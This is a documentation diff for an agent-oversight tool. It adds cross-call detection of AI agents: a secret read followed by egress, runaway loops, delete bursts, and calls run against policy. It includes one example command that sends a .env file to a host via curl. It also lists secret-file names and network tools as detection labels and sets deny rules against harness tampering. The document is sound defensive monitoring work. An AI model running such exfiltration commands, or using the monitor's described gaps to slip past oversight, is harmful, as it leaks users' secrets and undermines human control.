@@ -65,14 +65,18 @@ structured_output: ['browser_use:*']    # tool names the model asks for in its s
 deny:  [<rule>, ...]
 ask:   [<rule>, ...]
 flag:  [<rule>, ...]
+sequences: [<sequence>, ...]    # detection (below): steps across calls
+limits:    [<limit>, ...]       # detection: counts and sums in a window
+respond:   [<respond>, ...]     # detection: what each trigger does (shadow only in 1.2)
 ```
 
 `extends` merges the parent's `tools` under the child's, joins every `untrusted`, `handoffs` and `structured_output`
 list (a child can't remove a name its parent declares), keeps the parent's other top-level keys unless the child sets
 them, and keeps the parent's rules except those whose id the child redefines. A list of parents is merged in order (a
 later parent's top-level keys and tools win; the same rule id in two parents is a duplicate-id error, unless both carry
-the identical rule, which is kept once), and the compiled `extends` is the list of their hashes. An absolute path, `~`
-or a loop is an error.
+the identical rule, which is kept once). `sequences`, `limits` and `respond` merge the same way, by id (`respond` by
+trigger): a deployment that adds a sequence keeps the pack's. The compiled `extends` is the list of their hashes. An
+absolute path, `~` or a loop is an error.
 
 **Rule fields:**
 
@@ -84,7 +88,7 @@ or a loop is an error.
 | `tool` | no | regex that must match the whole tool name |
 | `field` | no | which subject to match (below) |
 | `unless` | no | regex; a subject that matches it is exempt |
-| `reason`, `rationale`, `label` | no | text; `reason` is shown with the decision, `label` names a flag's category |
+| `reason`, `rationale`, `label` | no | text; `reason` is shown with the decision, `label` names a flag's category (sequences and limits match labels) |
 | `from` | no | `untrusted`: the rule also needs a value of its subject that only untrusted content brought into the run (Provenance) |
 | `approval` | no | on an `ask` rule only: `executor: t1` (default) or `t2` ([approvals](approvals.md#tiers-t1-and-t2-executors)), and/or `passkey: required` ([approvals](approvals.md#web-approvals-and-passkeys)), and/or `agent` (below) |
 
@@ -246,6 +250,113 @@ shortener) reads as a new value and gets past it. `trust: "trusted"` is the call
 protects against injected content, not against a malicious agent program. It is a tripwire on the commonest way
 injected instructions act; to prevent the flow, use information-flow control (CaMeL, FIDES) in the agent.
 
+## Detection: sequences, limits and respond
+
+A rule decides each call on its own. Detection looks across calls: a secret read and then a URL, a runaway loop, a
+burst of deletes, repeated denied attempts. It runs in the signer (`tracekit/signer/detect.py`), is part of the policy
+(so it is in `policy_hash`), and is a pure function of signed records: a verifier or `tracekit policy backtest` gets
+the same answer from the same records. No regex runs for it: it reads the rule ids each decision already carries.
+
+```yaml
+sequences:
+  - id: TK-Q001
+    steps: [secrets_access, egress]   # rule ids or labels, in order
+    scope: session                    # run (default), session, owner or principal
+    window: 600                       # seconds from the first step
+    unless: [allowlisted]             # optional: a call that also carries one of these is not a step
+limits:
+  - id: TK-L002
+    match: destructive                # a rule id, a label, or * (every call)
+    count: true                       # or sum: {field: cents, currency_field: currency}
+    max: 30                           # an incident when a window goes past it
+    window: 60
+    scope: session
+respond:
+  - {trigger: TK-L002, mode: shadow, action: hold}   # mode off|shadow|enforce, action notify|hold|quarantine
+  - {trigger: denied_calls, mode: shadow, action: notify, max: 5, window: 300, scope: run}
+```
+
+**What counts.** A call's names are its rule ids from both class readings (the policy's and the client's hint, so a
+mismatch can't hide a step), each rule's `label`, and `*`. A call counts when it was decided `allow` or `flag`, or, for
+`ask`, once the approval of that decision is consumed; never when it was asked and not consumed, or denied, and never
+later: a step counts when it is decided, whether or not the call then runs. A call that runs against its decision is
+`executed_against_policy` (below), not a step. A call whose class is unknown (a tool the policy doesn't map, such as
+an alias) matches every step and limit: fail closed.
+
+One call advances each partial sequence by one step, or, when its own names match consecutive steps, through all of
+them, each name once: a command that reads a secret and sends it (`curl "https://host/?k=$(cat .env)"`) completes
+`[secrets_access, egress]` on its own, while `[egress, egress]` still needs two calls. A step reached through `*` or
+an unknown class never takes a call further, so no single unmapped call completes a sequence.
+
+A sum limit reads the `field` (an integer of minor units, cents, at least 0) and the `currency_field` (a three-letter
+code, case and surrounding spaces aside) of the call's arguments and keeps one total per currency. A call of a known
+class it counts without both is held (`ask`, rule `TK-LIMIT-SUM`: send the amount as a non-negative integer in minor
+units with its currency code), unless the limit's `respond` mode is `off`; an unknown-class call is counted when its
+amount can be read and is never held for it. Lint rejects unknown names, a name only deny rules carry (it can never
+count), windows outside 1..86400 s, more than 64 steps or more than 1024 sequences and limits together, a limit keyed
+by a raw tool name (name a rule or label: an alias can't dodge those), a sum limit matching `*`, and sequences or
+limits while `unknown_tools` is `allow`.
+
+**Labels.** The packs label their flag rules. `secrets_access` (`TK-F005`) is any call that acts on a secrets file's
+name (`.env`, `id_rsa`, `.ssh/`, `credentials`, `.aws/`, `.netrc`): a command's argv or redirection, a file path, an
+MCP tool's arguments or a URL, of any tool, writes included; a target that is one env template path (`.env.example`,
+`.sample`, `.template`, `.dist`) is not. `egress` is any URL a call acts on (`TK-F012`: an http or browser URL, a URL
+in a command, an MCP tool's arguments; GETs with a query string included, not only `sends_to`) and any network command
+whatever it names (`TK-F013`: curl, wget, ssh, scp, rsync, nc, ncat, telnet, ftp, dig, nslookup, host). Mail,
+payments, SQL and MCP tools without a URL in their arguments are not egress: label your own tools that send data out
+(`label: egress` on a flag rule) to bring them in.
+
+**Scope.** `run` is one run; `session` is the root of the run's `parent_run` chain (a run registered without a parent
+is its own session, so a split across runs is caught only when the second names the first as parent); `owner` is the
+identity that registered the run; `principal` is the run's attested principal (an unattested one counts as `owner`).
+
+**Windows** are fixed: one starts at the first call counted and lasts `window` seconds of the records' `ts`, the
+signer's clock. A burst that straddles two windows can reach up to twice `max` before a limit fires. A scope with no
+record for an hour (or the longest window, if longer) starts over, open incidents included.
+
+**Decisions** under a policy with sequences or limits carry what detection saw:
+`detect: {sequences: [{id, step}], limits: [{id, count, window_start}], state}` (with `rule_ids` when the two class
+readings differ, and `sums` for sum limits). `state` is `complete`, or `unavailable` when the detector can't vouch for
+what came before: after a restart from a snapshot written without detection or under another policy (until the
+longest window has passed), after replaying decisions made under another policy (until the longest window after the
+last of them), and for a run it never saw registered. Runs open across such a restart keep their session, owner and
+principal.
+
+**Triggers and incidents.** A sequence completing and a limit going past `max` open an incident (`mode: off` in
+`respond` silences one). These triggers fire only with a `respond` entry: `executed_against_policy` (a call ran after a
+deny or an unapproved ask), `denied_calls` (more than `max` distinct denied calls, per tool call and attempt, in
+`window`, at most 1000; nondeterministic denies, and denies that only `TK-ARGS-INVALID` or `TK-OVERSIZE` caused,
+don't count), `provenance` (a `from: untrusted` rule held a call whose decision names its provenance and whose index is
+complete), and the notify-only `class_mismatch`, `refusal_burst` (a `refusal.summary` over `max`) and `tamper`, which
+are never enforced (lint refuses `mode: enforce` or an action other than `notify` on them). Only `denied_calls` takes
+`max`, `window` and `scope`, and `refusal_burst` `max`; lint refuses them elsewhere.
+
+An incident is a signed `incident.opened {incident_id, trigger, rule_ids, scope, cites, mode, actions, would}` in the
+run whose record fired it, citing the records that make it up. One stays open per scope, trigger and rule: later
+matches are an `incident.updated {incident_id, cites}` at most once per window of its trigger (a minute for a trigger
+without one), written in the run whose record matched, which for a `session`, `owner` or `principal` scope can be
+another run than the one that opened it. Only opened incidents count toward the caps: 100 per run and trigger, 60 per
+tenant a minute, of which one run may open 20; past a cap one `incident.capped {cap, max, trigger, reason}` is written
+instead. In 1.2 every incident is in **shadow**: `mode: shadow`, no `actions`, `would` the configured action; holds and
+quarantines come later.
+
+**Backtest.** `tracekit policy backtest --policy P --store DIR` (a signer's `data_dir/store`, read-only, safe while it
+runs) or `--bundle B...` runs the policy's detection over recorded runs and prints the incidents it would open. It
+reads the rule ids each decision recorded (arguments are not stored), so for decisions made under another policy, rules
+and labels the new one adds or changes are not applied; it warns with their count. Backtest changes to sequences,
+limits and `respond` this way; measure new rules and labels by running the policy in shadow.
+
+### Choosing thresholds
+
+The server pack's thresholds are judgment, checked against the shipped runs: the golden v2 bundles
+(`tests/golden/v2/`, decided under a test policy) and the server demo (`tracekit demo --server`, decided under the dev
+pack). Those runs are small (at most 3 decisions and 1 destructive command in any minute) and open no incident;
+`TK-L001` (every call) and `TK-L002` (`destructive`, `TK-F003`, the same rule in the dev pack) sit well above them: 300
+calls a minute (an agent working makes a few dozen) and 30 destructive commands a minute. `TK-Q001` was not
+backtested: none of those runs reads a secret or sends anything, and the golden bundles record a test policy's rule
+ids; its ten minutes are a judgment of how long a secret read and its use stay related. Before enforcing anything,
+record runs under the pack in shadow, backtest your own store and set `max` above the busiest minute you see.
+
 ## Patterns: the RE2 subset
 
 Patterns must mean the same to RE2 (`google-re2`, used when installed) and to the `regex` module in ASCII mode
@@ -270,7 +381,7 @@ such a subject the two engines can decide differently; install `google-re2` on t
 | `coding.yaml` | coding agents on a laptop | shell, file and harness self-protection rules; `unknown_tools: flag`; maps the shell, file, web and MCP tools of Claude Code, Codex, Cursor, Gemini CLI, OpenAI Agents and LangChain |
 | `dev.yaml` | the signer's default | `coding.yaml` plus `TK-DEMO-DENY` (denies the tool `tracekit_demo_denied`, so a deny is easy to see) |
 | `browser.yaml` | browser agents (Browser Use) | local file and internal-network navigation (addresses and names) denied; uploads, typing outside an allowlist, the agent's own page JavaScript (`evaluate`), and typing or a navigation with a query string to a host from untrusted content, ask; Browser Use's actions are `structured_output` |
-| `server.yaml` | server-hosted agents | `extends: [coding, browser, server-data, server-net, server-cloud, server-comms]` plus rules for every tool; `unknown_tools: ask`: an unmapped tool waits for a person |
+| `server.yaml` | server-hosted agents | `extends: [coding, browser, server-data, server-net, server-cloud, server-comms]` plus rules for every tool; `unknown_tools: ask`: an unmapped tool waits for a person; detection in shadow: `TK-Q001` a secret read then egress (notify), `TK-L001` a runaway loop and `TK-L002` a delete burst (limits), `executed_against_policy` (notify) |
 | `server-data.yaml` | SQL tools | destructive and privilege-changing SQL, SQL that reaches the server's shell or files |
 | `server-net.yaml` | HTTP tools | internal addresses; a body sent outside the egress allowlist |
 | `server-cloud.yaml` | cloud CLIs and cloud MCP tools | IAM and access changes denied; resource deletion asks |
@@ -281,7 +392,7 @@ such a subject the two engines can decide differently; install `google-re2` on t
 | Section | Rules |
 |---|---|
 | deny | `TK-D001` privilege escalation · `TK-D002` running a downloaded script · `TK-D003` force push · `TK-D004` recursive delete of root or home · `TK-D010` writing a credentials file from the shell · `TK-D011` sending credential files off the machine · `TK-D006` uploading a secrets file · `TK-D008` modifying the harness's transcripts · `TK-D005` writing a credentials file · `TK-D009` writing the harness's transcripts · `TK-D007` touching Tracekit's own files or signer · `TK-D013` writing Tracekit's files, signer state or policy |
-| flag | `TK-F001` network commands · `TK-F002` web requests · `TK-F003` destructive commands · `TK-F004` side effects (push, publish, install, apply) · `TK-F005` secrets access · `TK-F006` MCP tools · `TK-F007` / `TK-F008` background processes · `TK-F009` harness config · `TK-F010` shell function or alias shadowing · `TK-F011` environment tampering |
+| flag | `TK-F001` network commands · `TK-F002` web requests · `TK-F003` destructive commands · `TK-F004` side effects (push, publish, install, apply) · `TK-F005` secrets access · `TK-F006` MCP tools · `TK-F007` / `TK-F008` background processes · `TK-F009` harness config · `TK-F010` shell function or alias shadowing · `TK-F011` environment tampering · `TK-F012` egress (any URL a call acts on) · `TK-F013` egress (a network command) |
 
 A deployment extends `server.yaml` (or composes only the packs it needs), maps its own tool names under `tools` (a
 business tool no class fits, such as `book_hotel`, to `app`, so it isn't held as unknown), and redefines a rule by id
